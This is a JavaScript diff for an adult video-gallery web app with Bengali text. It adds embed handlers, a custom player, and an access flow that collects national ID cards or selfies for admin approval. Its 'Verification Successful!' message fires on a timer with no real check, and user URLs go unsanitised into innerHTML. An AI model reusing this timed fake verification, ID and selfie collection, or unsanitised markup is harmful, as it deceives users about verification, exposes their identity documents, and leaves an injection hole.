+      if (url.includes('facebook.com') || url.includes('fb.watch')) {
+        let fm = url.match(/facebook\.com\/watch\/?\?v=(\d+)/);
+        if (!fm) fm = url.match(/facebook\.com\/[^\/]+\/videos\/(?:[^\/]+\/)?(\d+)/);
+        if (!fm) fm = url.match(/facebook\.com\/reel\/(\d+)/);
+        if (!fm) fm = url.match(/facebook\.com\/(?:photo|video)\.php\?v=(\d+)/);
+        const fbId = fm ? fm[1] : null;
+        if (fbId) {
+          return 'https://www.facebook.com/plugins/video.php?href=' + encodeURIComponent('https://www.facebook.com/watch/?v=' + fbId) + '&show_text=false&autoplay=0&width=560';
         }
+        return 'https://www.facebook.com/plugins/video.php?href=' + encodeURIComponent(url) + '&show_text=false&autoplay=0&width=560';
       }
 
-      let ytMatch = u.match(/(?:youtube\.com\/(?:watch\?.*v=|shorts\/|embed\/|live\/)|youtu\.be\/)([a-zA-Z0-9_-]{11})/);
-      if (ytMatch) {
-        return `<iframe src="https://www.youtube.com/embed/${ytMatch[1]}?autoplay=1&rel=0" allow="autoplay; encrypted-media; fullscreen" allowfullscreen style="width:100%; height:100%; border:none;"></iframe>`;
-      }
+      m = url.match(/tiktok\.com\/(?:@[^\/]+\/)?video\/(\d+)/);
+      if (m) return 'https://www.tiktok.com/embed/v2/' + m[1];
 
-      if (u.match(/\.(mp4|webm|ogg|mov|m4v)(\?.*)?$/i)) {
-        return `<video src="${u}" controls autoplay playsinline style="width:100%; height:100%; background:#000;"></video>`;
-      }
+      m = url.match(/dailymotion\.com\/video\/([a-zA-Z0-9]+)/);
+      if (m) return 'https://www.dailymotion.com/embed/video/' + m[1];
+      m = url.match(/dai\.ly\/([a-zA-Z0-9]+)/);
+      if (m) return 'https://www.dailymotion.com/embed/video/' + m[1];
 
-      return `<iframe src="${embedUrl}" allow="autoplay; encrypted-media; fullscreen" allowfullscreen style="width:100%; height:100%; border:none;"></iframe>`;
+      m = url.match(/vimeo\.com\/(\d+)/);
+      if (m) return 'https://player.vimeo.com/video/' + m[1];
+
+      m = url.match(/streamable\.com\/([a-zA-Z0-9]+)/);
+      if (m) return 'https://streamable.com/e/' + m[1];
+
+      m = url.match(/ok\.ru\/video\/(\d+)/);
+      if (m) return 'https://ok.ru/videoembed/' + m[1];
+
+      m = url.match(/drive\.google\.com\/file\/d\/([a-zA-Z0-9_-]+)/);
+      if (m) return 'https://drive.google.com/file/d/' + m[1] + '/preview';
+
+      m = url.match(/xnxx\.com\/video-([^\/\?\#]+)/);
+      if (m) return 'https://www.xnxx.com/embedframe/' + m[1];
+
+      return url;
     }
 
     function autoThumb(u) {
@@ -696,6 +875,8 @@
       u = String(u).trim();
       let m = u.match(/(?:youtube\.com\/(?:watch\?.*v=|shorts\/|embed\/|live\/)|youtu\.be\/)([a-zA-Z0-9_-]{11})/);
       if (m) return 'https://img.youtube.com/vi/' + m[1] + '/hqdefault.jpg';
+      m = u.match(/dailymotion\.com\/video\/([a-zA-Z0-9]+)/);
+      if (m) return 'https://www.dailymotion.com/thumbnail/video/' + m[1];
       return ''; 
     }
 
@@ -724,14 +905,148 @@
       });
     }
 
+    /* ========================================================
+       ✅✅ কাস্টম ভিডিও প্লেয়ার (⏪ ⏸️ ⏩ বাটন সহ)
+       ======================================================== */
+    let currentVideo = null;
+    let controlsHideTimer = null;
+
     function openPlayer(v) {
       const playerBox = document.getElementById('playerBox');
-      playerBox.innerHTML = toEmbed(v.url);
+      const converted = convertToEmbedUrl(v.url);
+      
+      playerBox.innerHTML = '';
+      currentVideo = null;
+
+      if (!converted) {
+        playerBox.innerHTML = '<p style="color:#fff; text-align:center; padding:20px;">ভিডিও লিংক পাওয়া যায়নি!</p>';
+      } else if (/\.(mp4|webm|ogg|mov|m4v)(\?.*)?$/i.test(converted)) {
+        playerBox.innerHTML = `
+          <video id="customVideo" src="${converted}" playsinline style="width:100%; height:100%; background:#000; object-fit:contain;"></video>
+          <div class="video-overlay" id="videoOverlay">
+            <button type="button" class="ctl-btn" onclick="seekVideo(-10)"><i class="fa-solid fa-backward"></i></button>
+            <button type="button" class="ctl-btn" id="playPauseBtn" onclick="togglePlayPause()"><i class="fa-solid fa-pause"></i></button>
+            <button type="button" class="ctl-btn" onclick="seekVideo(10)"><i class="fa-solid fa-forward"></i></button>
+          </div>
+          <div class="video-progress-wrap" id="progressWrap">
+            <span id="curTime">0:00</span>
+            <input type="range" id="seekBar" min="0" max="100" value="0" step="0.1">
+            <span id="durTime">0:00</span>
+          </div>
+        `;
+        currentVideo = document.getElementById('customVideo');
+        setupVideoEvents();
+      } else if (converted.includes('<iframe')) {
+        const srcMatch = converted.match(/src=["']([^"']+)["']/);
+        const iframeSrc = srcMatch ? srcMatch[1] : '';
+        playerBox.innerHTML = `<iframe src="${iframeSrc}" sandbox="allow-scripts allow-same-origin allow-presentation" allow="autoplay; encrypted-media; fullscreen; picture-in-picture" allowfullscreen style="width:100%; height:100%; border:none;"></iframe>`;
+      } else if (converted.includes('<video')) {
+        playerBox.innerHTML = converted.replace(/width="[^"]*"/g, 'width="100%"').replace(/height="[^"]*"/g, 'height="100%"');
+      } else {
+        playerBox.innerHTML = `<iframe src="${converted}" sandbox="allow-scripts allow-same-origin allow-presentation" allow="autoplay; encrypted-media; fullscreen; picture-in-picture" allowfullscreen style="width:100%; height:100%; border:none;"></iframe>`;
+      }
+
       document.getElementById('playerTitle').innerText = v.title || '';
       document.getElementById('playerModal').style.display = 'flex';
     }
 
+    function setupVideoEvents() {
+      if (!currentVideo) return;
+
+      const seekBar = document.getElementById('seekBar');
+      const curTime = document.getElementById('curTime');
+      const durTime = document.getElementById('durTime');
+      const playPauseBtn = document.getElementById('playPauseBtn');
+
+      currentVideo.addEventListener('loadedmetadata', () => {
+        durTime.innerText = formatTime(currentVideo.duration);
+      });
+
+      currentVideo.addEventListener('timeupdate', () => {
+        if (currentVideo.duration && !seekBar.matches(':active')) {
+          seekBar.value = (currentVideo.currentTime / currentVideo.duration) * 100;
+          curTime.innerText = formatTime(currentVideo.currentTime);
+        }
+      });
+
+      currentVideo.addEventListener('play', () => {
+        playPauseBtn.innerHTML = '<i class="fa-solid fa-pause"></i>';
+      });
+
+      currentVideo.addEventListener('pause', () => {
+        playPauseBtn.innerHTML = '<i class="fa-solid fa-play"></i>';
+      });
+
+      currentVideo.addEventListener('ended', () => {
+        playPauseBtn.innerHTML = '<i class="fa-solid fa-rotate-right"></i>';
+      });
+
+      seekBar.addEventListener('input', () => {
+        if (currentVideo && currentVideo.duration) {
+          currentVideo.currentTime = (seekBar.value / 100) * currentVideo.duration;
+        }
+      });
+
+      currentVideo.addEventListener('click', (e) => {
+        const overlay = document.getElementById('videoOverlay');
+        const progress = document.getElementById('progressWrap');
+        if (overlay.style.opacity === '0' || !overlay.style.opacity) {
+          overlay.style.opacity = '1';
+          progress.style.opacity = '1';
+          scheduleHideControls();
+        } else {
+          overlay.style.opacity = '0';
+          progress.style.opacity = '0';
+        }
+      });
+
+      currentVideo.play().catch(() => {});
+
+      scheduleHideControls();
+    }
+
+    function scheduleHideControls() {
+      clearTimeout(controlsHideTimer);
+      controlsHideTimer = setTimeout(() => {
+        const overlay = document.getElementById('videoOverlay');
+        const progress = document.getElementById('progressWrap');
+        if (overlay) overlay.style.opacity = '0';
+        if (progress) progress.style.opacity = '0';
+      }, 3000);
+    }
+
+    window.seekVideo = (seconds) => {
+      if (currentVideo && currentVideo.duration) {
+        currentVideo.currentTime = Math.max(0, Math.min(currentVideo.duration, currentVideo.currentTime + seconds));
+        scheduleHideControls();
+      }
+    };
+
+    window.togglePlayPause = () => {
+      if (currentVideo) {
+        if (currentVideo.paused) {
+          currentVideo.play();
+        } else {
+          currentVideo.pause();
+        }
+        scheduleHideControls();
+      }
+    };
+
+    function formatTime(seconds) {
+      if (!seconds || isNaN(seconds) || seconds === Infinity) return '0:00';
+      const mins = Math.floor(seconds / 60);
+      const secs = Math.floor(seconds % 60);
+      return mins + ':' + (secs < 10 ? '0' : '') + secs;
+    }
+
     window.closePlayer = () => {
+      if (currentVideo) {
+        currentVideo.pause();
+        currentVideo.src = '';
+        currentVideo = null;
+      }
+      clearTimeout(controlsHideTimer);
       document.getElementById('playerBox').innerHTML = '';
       document.getElementById('playerModal').style.display = 'none';
     };
@@ -773,42 +1088,45 @@
       setTimeout(() => {
         document.getElementById('vSpin').style.display = 'none';
         document.getElementById('vStat').innerHTML = '<div class="vok">✅</div>Verification Successful!';
-        setTimeout(() => { openGallery(); }, 1400);
+        setTimeout(async () => {
+          await requestAdminAccess('selfie');
+        }, 1400);
       }, 3000);
     }
 
     window.handleLogout = () => {
       if (confirm("আপনি কি লগআউট করতে চান?")) {
         localStorage.removeItem('ageVerified18');
-        goPage('optPage');
+        localStorage.removeItem('verifyTime18');
+        localStorage.removeItem('adminApproved18');
+        localStorage.removeItem('svAdultEntry');
+        window.location.href = 'https://secret-video-smoky.vercel.app/';
       }
     };
 
     window.onload = async function() {
-      const verified = localStorage.getItem('ageVerified18');
-      if (verified === 'yes') {
-        buildGallery();
-        goPage('galleryPage');
-      } else {
-        try {
-          if (!auth.currentUser) await signInAnonymously(auth);
-          const snap = await get(ref(db, 'nidRequests/' + currentUserId));
-          if (snap.exists()) {
-            const data = snap.val();
-            if (data.status === 'pending') {
-              showPendingScreen("⏳ এনআইডি কার্ড রিভিউতে রয়েছে", "আপনার এনআইডি কার্ডটি ইতিমধ্যে সাবমিট করা হয়েছে। অ্যাডমিন এপ্রুভ করলেই বাটন দেখতে পাবেন।", true);
-            } else if (data.status === 'approved') {
-              document.getElementById('pendingSpin').style.display = 'none';
-              document.getElementById('statusIcon').innerHTML = '✅';
-              document.getElementById('statusIcon').style.display = 'block';
-              document.getElementById('statusTitle').innerText = "অভিনন্দন! আপনার NID এপ্রুভ করা হয়েছে।";
-              document.getElementById('statusDesc').innerText = "এখন আপনি নিচের বাটনে ক্লিক করে সরাসরি ভিডিও দেখতে পারবেন।";
-              document.getElementById('enterGalleryBtn').style.display = 'block';
-              goPage('pendingPage');
-            }
+      try {
+        if (!auth.currentUser) await signInAnonymously(auth);
+        const snap = await get(ref(db, 'nidRequests/' + currentUserId));
+        if (snap.exists()) {
+          const data = snap.val();
+          if (data.status === 'approved') {
+            localStorage.setItem('ageVerified18', 'yes');
+            localStorage.setItem('verifyTime18', Date.now().toString());
+            localStorage.setItem('adminApproved18', 'yes');
+            buildGallery();
+            goPage('galleryPage');
+            return;
+          } else if (data.status === 'pending') {
+            showPendingScreen(data.method || 'nid');
+            return;
+          } else if (data.status === 'rejected') {
+            showRejectedOnPending();
+            return;
           }
-        } catch(e) {}
-      }
+        }
+      } catch(e) {}
+      goPage('optPage');
     };
   </script>
 
